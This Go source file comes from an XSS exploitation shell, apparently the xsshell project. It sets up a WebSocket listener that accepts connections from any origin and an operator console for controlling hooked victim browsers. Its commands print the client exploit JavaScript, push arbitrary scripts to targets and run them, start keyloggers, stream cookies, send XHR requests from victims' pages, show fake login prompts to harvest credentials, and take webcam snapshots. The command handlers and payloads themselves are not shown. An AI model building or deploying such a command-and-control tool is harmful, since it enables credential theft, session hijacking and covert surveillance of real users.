package shell

//go:generate go run go-gen-payloads.go
//go:generate go fmt payloads/payloads.go

import (
	"bufio"
	"bytes"
	"github.com/gorilla/websocket"
	"github.com/raz-varren/xsshell/config"
	"io"
	"net/http"
	"os"
	"regexp"
	"sync"
	"time"
)

const (
	bufferDrainRate = time.Second
	shellPrefixStr  = "xsshell > "
)

var (
	shellPrefixBytes = []byte(shellPrefixStr)

	regCmdToken = regexp.MustCompile(`^(\\[a-zA-Z\-_\?]+)\s*(.*)`)
)

type Shell struct {
	//general configuration
	c *config.Config
	u *websocket.Upgrader

	//console input
	userInWriter io.Writer
	userIn       *bufio.Reader

	//command management
	cmds       map[string]*cmd
	cmdRunning bool
	cmdMu      *sync.RWMutex

	//command context
	cctx *cctx

	//console
	consoleOut io.Writer
	consoleBuf *bytes.Buffer
	consoleMu  *sync.RWMutex

	//socket management
	openSockets map[string]*socket
	socketMu    *sync.RWMutex
	socketInc   int
}

func newCCTX() *cctx {
	c := &cctx{
		mu:  &sync.RWMutex{},
		ctx: map[string]string{"targets": "*"},
	}

	return c
}

type cctx struct {
	mu  *sync.RWMutex
	ctx map[string]string
}

func (c *cctx) Set(k, v string) {
	c.mu.Lock()
	defer c.mu.Unlock()
	c.ctx[k] = v
}

func (c *cctx) Get(k string) string {
	c.mu.RLock()
	defer c.mu.RUnlock()
	return c.ctx[k]
}

func (c *cctx) Del(k string) {
	c.mu.Lock()
	defer c.mu.Unlock()
	delete(c.ctx, k)
}

func New(c *config.Config) (*Shell, error) {
	pipeR, pipeW, err := os.Pipe()
	if err != nil {
		return nil, err
	}
	go func() { io.Copy(pipeW, os.Stdin) }()

	s := &Shell{
		c: c,
		u: &websocket.Upgrader{
			ReadBufferSize:  c.ReadBufferSize,
			WriteBufferSize: c.WriteBufferSize,
			CheckOrigin: func(r *http.Request) bool {
				return true
			},
		},

		userInWriter: pipeW,
		userIn:       bufio.NewReader(pipeR),

		cmds:  make(map[string]*cmd),
		cmdMu: &sync.RWMutex{},
		cctx:  newCCTX(),

		consoleOut: os.Stdout,
		consoleBuf: bytes.NewBuffer(nil),
		consoleMu:  &sync.RWMutex{},

		socketMu:    &sync.RWMutex{},
		openSockets: make(map[string]*socket),
	}

	cmdExploit := &cmd{
		desc: "print out the client exploit javascript",
		run:  s.printExploit,
	}

	cmdExploitMin := &cmd{
		desc: "print out the minified version of the client exploit javascript",
		run:  s.printExploitMin,
	}

	cmdLL := &cmd{
		desc: "list out any links found on the target set's currently open page",
		run:  s.listLinks,
	}

	cmdHelp := &cmd{
		desc: "list available commands",
		run:  s.help,
	}

	cmdQuit := &cmd{
		desc: "exit this program",
		run:  s.quit,
	}

	cmdSetTargets := &cmd{
		desc: `set the websockets to target. one or more targets can be set with the following methods:
*        -targets all active websocket connections (default target set)
8        -target a single websocket connection belonging to that id number
1,2,8,10 -targets all websocket IDs in the comma separated list
4-16     -targets all websocket IDs from the lowest number listed to the highest number listed
4-       -targets all websocket IDs that are greater than or equal to the listed number
-16      -targets all websocket IDs that are less than or equal to the listed number`,
		usage: `\st TARGET_SET
examples:
    \st *
    \st 2
    \st 2,4,7
    \st 10-15
    \st 6-
    \st -100`,
		run: s.setTargets,
	}

	cmdSendFile := &cmd{
		desc: `send a javascript file to the target set and execute it. 
any data can be returned from the target set by calling ` + "`" + `this.send(\"return data string\");` + "`" + ` in the script. 
relative file paths are relative to the path provided to -wrkdir`,
		usage: `\sf FILE_PATH`,
		run:   s.sendFile,
	}

	cmdSendFileLast := &cmd{
		desc: "resend the last file that was sent using \\sf, includes any new changes to the file",
		run:  s.sendFileLast,
	}

	cmdPrintSockets := &cmd{
		desc: "print out socket info for all actively connected websockets",
		run:  s.printSockets,
	}

	cmdAlert := &cmd{
		desc:  "send an alert message to the target set",
		usage: `\alert ALERT_MESSAGE`,
		run:   s.alert,
	}

	cmdKeyLogger := &cmd{
		desc: "start a keylogger on the target set",
		run:  s.keyLogger,
	}

	cmdPageSource := &cmd{
		desc: "get the target set's currently rendered page source",
		run:  s.pageSource,
	}

	cmdCookieStream := &cmd{
		desc: "get the current cookies from the target set's current page and any cookie updates.",
		run:  s.cookieStream,
	}

	cmdXHR := &cmd{
		desc: "send an xhr request from the target set's current page",
		usage: `\xhr HTTP_METHOD FULL_URL [CONTENT_HEADER] [POST_BODY]
examples:
    \xhr GET https://google.com/
    \xhr POST https://google.com/ application/json {"hello": "world"}`,
		run: s.xhr,
	}

	cmdGetImages := &cmd{
		desc: `download all images on the target set's page. 
images will be stored in DOWNLOAD_DIR. 
relative file paths are relative to the path provided to -wrkdir`,
		usage: `\gi [DOWNLOAD_DIR]
examples:
    \gi
    \gi /tmp/images
    \gi imgdir`,
		run: s.getImages,
	}

	cmdPromptForLogin := &cmd{
		desc: "open a modal on the target set's page prompting them for a username and password",
		run:  s.promptForLogin,
	}

	cmdEnumerateMediaDevices := &cmd{
		desc: "return a list of media devices accessible to the target set's browser",
		run:  s.enumerateMediaDevices,
	}

	cmdWebcamSnapshot := &cmd{
		desc: `attempt to take a snapshot from the target set's webcam, if one is available. 
images will be stored in DOWNLOAD_DIR. 
relative file paths are relative to the path provided to -wrkdir.
NOTE: using this command may prompt the target set for webcam access. 
the target set may reject the prompt, or ignore it entirely.`,
		usage: `\ws [DOWNLOAD_DIR]
examples:
    \wcs /tmp/webcam_snaps
    \wcs snaps`,
		run: s.webcamSnapshot,
	}

	//build command list
	s.cmds[`\ex`] = cmdExploit
	s.cmds[`\exm`] = cmdExploitMin
	s.cmds[`\ll`] = cmdLL
	s.cmds[`\?`] = cmdHelp
	s.cmds[`\h`] = cmdHelp
	s.cmds[`\help`] = cmdHelp
	s.cmds[`\q`] = cmdQuit
	s.cmds[`\st`] = cmdSetTargets
	s.cmds[`\sf`] = cmdSendFile
	s.cmds[`\sfl`] = cmdSendFileLast
	s.cmds[`\ps`] = cmdPrintSockets
	s.cmds[`\alert`] = cmdAlert
	s.cmds[`\kl`] = cmdKeyLogger
	s.cmds[`\src`] = cmdPageSource
	s.cmds[`\cs`] = cmdCookieStream
	s.cmds[`\xhr`] = cmdXHR
	s.cmds[`\gi`] = cmdGetImages
	s.cmds[`\pfl`] = cmdPromptForLogin
	s.cmds[`\emd`] = cmdEnumerateMediaDevices
	s.cmds[`\wcs`] = cmdWebcamSnapshot

	go s.drainBuffer()
	go s.startConsole()

	return s, nil
}

func (s *Shell) StartConsole() {
	s.startConsole()
}

func (s *Shell) Err(e error) {
	s.consoleWriteStr("ERROR: " + e.Error())
}
